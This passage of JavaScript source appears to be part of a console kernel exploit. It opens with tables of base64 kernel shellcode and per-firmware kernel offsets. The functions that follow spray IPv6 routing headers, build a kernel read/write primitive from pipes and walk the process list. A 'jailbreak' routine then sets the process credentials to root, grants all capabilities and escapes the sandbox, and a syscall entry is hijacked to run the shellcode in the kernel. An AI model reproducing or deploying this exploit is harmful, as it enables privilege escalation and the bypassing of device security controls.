EgNAAABAA8iwDHAww==",
            SYSENT_661: 0x110A980,
            JMP_RSI_GADGET: 0x68B1,
            KL_LOCK: 0x45B10,
            EVF_OFFSET: 0x7B5133
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYETMCEAuOsEAABBuesAAABBuusAAABmiYHsskcAQbvrAAAAuJDp//9IgcItDAUAZomxIzAhAGaJuUMwIQBmRImBtH1iAMaBzQoAAOvGgb1yDQDrxoEBcw0A68aBfXMNAOvGgcFzDQDrxoFtdQ0A68aBHXoNAOvGge16DQDrZkSJiZ+GYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgcbBCADrZomB1CohAMeBiDAhAJDpPAHHgWCrLQBIMcDDxoEqxBkAN8aBLcQZADfHgdArEAECAAAASImR2CsQAceB/CsQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYHxyTQAuOsGAAC/BQAAAGaJgTPKNABBugEAAABIuEGDv6AEAAAAQbsBAAAASImBO8o0ALgEAAAAZomBTco0ALhJi///x4FJyjQASYuH0MaBT8o0AADHgVbKNABJi7ewZomRWso0AMaBXMo0AADHgW7KNABJi4dAZomxcso0AMaBdMo0AADHgXvKNABJi7cgZom5f8o0AMaBgco0AADHgZPKNABJjb/AZkSJgZfKNADGgZnKNAAAx4GfyjQASY2/4GZEiYmjyjQAxoGlyjQAAMeBsso0AEmNvwBmRImRtso0AMaBuMo0AADHgb7KNABJjb8gZkSJmcLKNADGgcTKNAAAZomBz8o0AMaB0co0AP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x110A5B0,
            JMP_RSI_GADGET: 0x50DED,
            KL_LOCK: 0x25E330,
            EVF_OFFSET: 0x7A7B14
        }
    }, 
    11: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYEzTB4AuOsEAABBuesAAABBuusAAABmiYHsyDUAQbvrAAAAuJDp//9IgcJhGAcAZomxQ0weAGaJuWNMHgBmRImBZD9iAMaBzQoAAOvGgT3dLQDrxoGB3S0A68aB/d0tAOvGgUHeLQDrxoHt3y0A68aBneQtAOvGgW3lLQDrZkSJiU9IYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVQwDrZomB9EYeAMeBqEweAJDpPAHHgeCMCABIMcDDxoFqYhUAN8aBbWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYGx2zAAuOsGAAC/BQAAAGaJgfPbMABBugEAAABIuEGDv6AEAAAAQbsBAAAASImB+9swALgEAAAAZomBDdwwALhJi///x4EJ3DAASYuH0MaBD9wwAADHgRbcMABJi7ewZomRGtwwAMaBHNwwAADHgS7cMABJi4dAZomxMtwwAMaBNNwwAADHgTvcMABJi7cgZom5P9wwAMaBQdwwAADHgVPcMABJjb/AZkSJgVfcMADGgVncMAAAx4Ff3DAASY2/4GZEiYlj3DAAxoFl3DAAAMeBctwwAEmNvwBmRImRdtwwAMaBeNwwAADHgX7cMABJjb8gZkSJmYLcMADGgYTcMAAAZomBj9wwAMaBkdwwAP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1109350,
            JMP_RSI_GADGET: 0x71A21,
            KL_LOCK: 0x58F10,
            EVF_OFFSET: 0x7FC26F
        },
        2: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYFTTB4AuOsEAABBuesAAABBuusAAABmiYEMyTUAQbvrAAAAuJDp//9IgcJhGAcAZomxY0weAGaJuYNMHgBmRImBBD9iAMaBzQoAAOvGgV3dLQDrxoGh3S0A68aBHd4tAOvGgWHeLQDrxoEN4C0A68aBveQtAOvGgY3lLQDrZkSJie9HYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgbYUQwDrZomBFEceAMeByEweAJDpPAHHgeCMCABIMcDDxoGKYhUAN8aBjWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYHR2zAAuOsGAAC/BQAAAGaJgRPcMABBugEAAABIuEGDv6AEAAAAQbsBAAAASImBG9wwALgEAAAAZomBLdwwALhJi///x4Ep3DAASYuH0MaBL9wwAADHgTbcMABJi7ewZomROtwwAMaBPNwwAADHgU7cMABJi4dAZomxUtwwAMaBVNwwAADHgVvcMABJi7cgZom5X9wwAMaBYdwwAADHgXPcMABJjb/AZkSJgXfcMADGgXncMAAAx4F/3DAASY2/4GZEiYmD3DAAxoGF3DAAAMeBktwwAEmNvwBmRImRltwwAMaBmNwwAADHgZ7cMABJjb8gZkSJmaLcMADGgaTcMAAAZomBr9wwAMaBsdwwAP8PIMBIDQAAAQAPIsAxwMM=",
            EVF_OFFSET: 0x7FC22F
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYGsvi8AQbvrAAAAuJDp//9IgcIVAwcAZomxs3YbAGaJudN2GwBmRImBtHhiAMaBzQoAAOvGge3SKwDrxoEx0ysA68aBrdMrAOvGgfHTKwDrxoGd1SsA68aBTdorAOvGgR3bKwDrZkSJiZ+BYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgaYSOQDrZomBZHEbAMeBGHcbAJDpPAHHgSDWOwBIMcDDxoE6ph8AN8aBPaYfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x110A760,
            JMP_RSI_GADGET: 0x704D5,
            KL_LOCK: 0xE6C20,
            EVF_OFFSET: 0x784318
        }
    }, 
    12: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYHswC8AQbvrAAAAuJDp//9IgcJxeQQAZomxs3YbAGaJudN2GwBmRImB9HpiAMaBzQoAAOvGgc3TKwDrxoER1CsA68aBjdQrAOvGgdHUKwDrxoF91isA68aBLdsrAOvGgf3bKwDrZkSJid+DYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgeYUOQDrZomBZHEbAMeBGHcbAJDpPAHHgWDYOwBIMcDDxoEapx8AN8aBHacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
            JMP_RSI_GADGET: 0x47B31,
            EVF_OFFSET: 0x784798,
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYEswS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBNHtiAMaBzQoAAOvGgQ3UKwDrxoFR1CsA68aBzdQrAOvGgRHVKwDrxoG91isA68aBbdsrAOvGgT3cKwDrZkSJiR+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgaDYOwBIMcDDxoFapx8AN8aBXacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            EVF_OFFSET: -1,
        }
    }, 
    13: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM="
        }
    }
};
//#endregion
//#region Functions
function build_rthdr(addr, sz) {
    var rthdr0 = ip6_rthdr0.from(addr);

    var in6_count = Math.floor((sz - ip6_rthdr0.sizeof) / in6_addr.sizeof);

    rthdr0.ip6r0_nxt = 0;
    rthdr0.ip6r0_len = in6_count * 2;
    rthdr0.ip6r0_type = 0;
    rthdr0.ip6r0_segleft = in6_count;

    return ip6_rthdr0.sizeof + (in6_addr.sizeof * in6_count);
};

function get_rthdr(sock, sz) {
    var leak_rthdr0_len_addr = alloc(4);
    view(leak_rthdr0_len_addr).setInt32(0, sz, true);
    if (getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr).eq(-1)) {
        throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
    }

    return view(leak_rthdr0_len_addr).getInt32(0, true);
};

function set_rthdr(sock) {
    if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0_addr, spray_rthdr0_len).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }
};

function free_rthdr(sock) {
    if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }
};

function make_udp6_sock() {
    var sock = socket.invoke(AF_INET6, SOCK_DGRAM, 0);
    if (sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }

    return sock;
};

function make_udp_sock() {
    var sock = socket.invoke(AF_INET, SOCK_DGRAM, 0);
    if (sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }

    return sock;
};

function make_tcp6_sock() {
    var sock = socket.invoke(AF_INET6, SOCK_STREAM, 0);
    if (sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }

    return sock;
};

function make_tcp_sock() {
    var sock = socket.invoke(AF_INET, SOCK_STREAM, 0);
    if (sock.eq(-1)) {
        throw new SyscallError("Unable to create socket !!");
    }

    return sock;
};

function make_karw_pipe() {
    var pair_addr = alloc(8);

    // Create karw pipe
    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }

    master_pipe[0] = view(pair_addr).getInt32(0, true);
    master_pipe[1] = view(pair_addr).getInt32(4, true);

    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }

    slave_pipe[0] = view(pair_addr).getInt32(0, true);
    slave_pipe[1] = view(pair_addr).getInt32(4, true);

    debug(`master_pipe: ${master_pipe.map(v => v.hex())}`);
    debug(`slave_pipe: ${slave_pipe.map(v => v.hex())}`);

    dispose(pair_addr);
};

function free_karw_pipe() {
    if (typeof kv === "undefined") {
        for (var i = 0; i < master_pipe.length; i++) {
            if (master_pipe[i] === 0) {
                continue;
            }

            if (close.invoke(master_pipe[i]).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${master_pipe[i]} !!`);
            }
        }
        
        for (var i = 0; i < slave_pipe.length; i++) {
            if (slave_pipe[i] === 0) {
                continue;
            }

            if (close.invoke(slave_pipe[i]).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${slave_pipe[i]} !!`);
            }
        }
    }
};

function kview(addr) {
    if (kv.get_backing().neq(addr)) {
        kv.set_backing(addr);
    }

    return kv;
};

function fget(fd) {
    return kview(fdt_ofiles).getBigInt(fd * FILEDESCENT_SIZE, true);
};

function fput(fd, fp) {
    return kview(fdt_ofiles).setBigInt(fd * FILEDESCENT_SIZE, fp, true);
};

function fhold(fp) {
    var f_count = kview(fp).getUint32(0x28, true);
    kview(fp).setUint32(0x28, f_count + 1, true);
};

function pfind(pid) {
    var p = kview(allproc).getBigInt(0, true);
    while (p.neq(0)) {
        var p_pid = kview(p).getInt32(0xB0, true);
        if (p_pid === pid) {
            break;
        }

        p = kview(p).getBigInt(0, true); // p_list.le_next
    }
    
    return p;
};

function get_in6p_outputopts(fd) {
    var fp = fget(fd);
    var f_data = kview(fp).getBigInt(0, true);
    var so_pcb = kview(f_data).getBigInt(0x18, true);
    return kview(so_pcb).getBigInt(0x118, true); // in6p_outputopts
}

function remove_pktinfo_from_so(fd) {
    kview(get_in6p_outputopts(fd)).setBigInt(0x10, 0, true); // ip6po_pktinfo
};

function remove_rthdr_from_so(fd) {
    kview(get_in6p_outputopts(fd)).setBigInt(0x68, 0, true); // ip6po_rthdr
};

function inc_karw_pipe_refcnt() {
    fhold(fget(master_pipe[0]));
    fhold(fget(master_pipe[1]));
    fhold(fget(slave_pipe[0]));
    fhold(fget(slave_pipe[1]));
};

function find_all_proc() {
    log("Finding allproc...");

    var tmp_pipe = new Array(2);

    var pair_addr = alloc(8);

    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }
    
    tmp_pipe[0] = view(pair_addr).getInt32(0, true);
    tmp_pipe[1] = view(pair_addr).getInt32(4, true);

    dispose(pair_addr);

    var pid = getpid.invoke();

    var pid_addr = alloc(4);
    view(pid_addr).setInt32(0, pid, true);

    if (ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr).eq(-1)) {
        throw new SyscallError(`Unable to ioctl for fd ${tmp_pipe[0]} !!`);
    }

    dispose(pid_addr);

    var fp = fget(tmp_pipe[0]);
    var f_data = kview(fp).getBigInt(0, true);
    var pipe_sigio = kview(f_data).getBigInt(0xD0, true);
    var p = kview(pipe_sigio).getBigInt(0, true);

    var mask = new BigInt("0xFFFFFFFF00000000");
    while (p.and(mask).neq(mask)) {
        p = kview(p).getBigInt(8, true); // p_list.le_prev
    }

    allproc = p;
    log(`allproc: ${allproc}`);

    if (close.invoke(tmp_pipe[0]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${tmp_pipe[0]} !!`);
    }

    if (close.invoke(tmp_pipe[1]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${tmp_pipe[1]} !!`);
    }
};

function jailbreak() {
    log("Initiate jailbreak...");

    var pid = getpid.invoke();

    var p = pfind(pid.valueOf());
    var kp = pfind(KERNEL_PID);

    // Patch credentials and capabilities
    var p_ucred = kview(p).getBigInt(0x40, true);
    var kp_ucred = kview(kp).getBigInt(0x40, true);

    var prison0 = kview(kp_ucred).getBigInt(0x30, true);

    kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
    kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
    kview(p_ucred).setInt32(0x0C, 0, true); // cr_svuid
    kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
    kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
    kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
    kview(p_ucred).setBigInt(0x30, prison0, true); // cr_prison
    kview(p_ucred).setBigInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
    kview(p_ucred).setBigInt(0x60, -1, true); // cr_sceCaps[1]
    kview(p_ucred).setBigInt(0x68, -1, true); // cr_sceCaps[0]
    kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

    // Allow root file system access
    var p_fd = kview(p).getBigInt(0x48, true);
    var kp_fd = kview(kp).getBigInt(0x48, true);

    var root_vnode = kview(kp_fd).getBigInt(0x10, true);
    
    kview(p_fd).setBigInt(0x10, root_vnode, true); // fd_rdir
    kview(p_fd).setBigInt(0x18, root_vnode, true); // fd_jdir

    log("Achieved jailbreak !!");
};

// intended for use only after kernel arw
function kernel_patches() {
    log("Applying kernal patches...");

    var shellcode = atob(KernelMisc.SHELLCODE(version));

    var sysent_661_addr = kernel_base.add(KernelMisc.SYSENT_661(version));
    debug(`sysent_661_addr: ${sysent_661_addr}`);

    var jmp_rsi_gadget_addr = kernel_base.add(KernelMisc.JMP_RSI_GADGET(version));
    debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);

    var sy_narg = kview(sysent_661_addr).getUint32(0, true);
    var sy_call = kview(sysent_661_addr).getBigInt(8, true);
    var sy_thrcnt = kview(sysent_661_addr).getUint32(0x2C, true);

    kview(sysent_661_addr).setUint32(0, 2, true);
    kview(sysent_661_addr).setBigInt(8, jmp_rsi_gadget_addr, true);
    kview(sysent_661_addr).setUint32(0x2C, 1, true);

    var sz = shellcode.length.align_up(PAGE_SIZE);
    var prot = PROT_READ | PROT_WRITE | PROT_EXEC;
    var flags = MAP_SHARED | MAP_FIXED;
    
    var exec_fd = jitshm_create.invoke(0, sz, prot);
    debug(`exec_fd: ${exec_fd}`);
    if (exec_fd.eq(-1)) {
        throw new SyscallError("Unablet to create JIT shared memory with rwx !!")
    }

    var mapping_addr = new BigInt(9, 0x20100000);

    if (mmap.invoke(mapping_addr, sz, prot, flags, exec_fd, 0).eq(-1)) {
      throw new SyscallError(`Unable to map memory with size ${sz} with rwx !!`);
    }

    copy(mapping_addr, shellcode.get_backing(), shellcode.length);

    var ret = kexec.invoke(mapping_addr);
    debug(`kexec_ret: ${ret}`);
    if (ret.eq(-1)) {
        throw new SyscallError(`Unable to kexec ${mapping_addr} !!`)
    }

    kview(sysent_661_addr).setUint32(0, sy_narg, true);
    kview(sysent_661_addr).setBigInt(8, sy_call, true);
    kview(sysent_661_addr).setUint32(0x2C, sy_thrcnt, true);

    log("Kernal patches applied !!");
};
//#endregion
//#region Structs
var in6_addr = new Struct("in6_addr", [
    { type: "Uint8", name: "s6_addr", count: 16 }
]);

var ip6_rthdr0 = new Struct("ip6_rthdr0", [
    { type: "Uint8", name: "ip6r0_nxt" },
    { type: "Uint8", name: "ip6r0_len" },
    { type: "Uint8", name: "ip6r0_type" },
    { type: "Uint8", name: "ip6r0_segleft" },
    { type: "Uint32", name: "ip6r0_reserved" },
    { type: "in6_addr", name: `ip6r0_addr`, count: 0 }
]);

var pipebuf = new Struct("pipebuf", [
    { type: "Uint32", name: "cnt" },
    { type: "Uint32", name: "in" },
    { type: "Uint32", name: "out" },
    { type: "Uint32", name: "size" },
    { type: "Uint64", name: "buffer" },
]);
//#endregion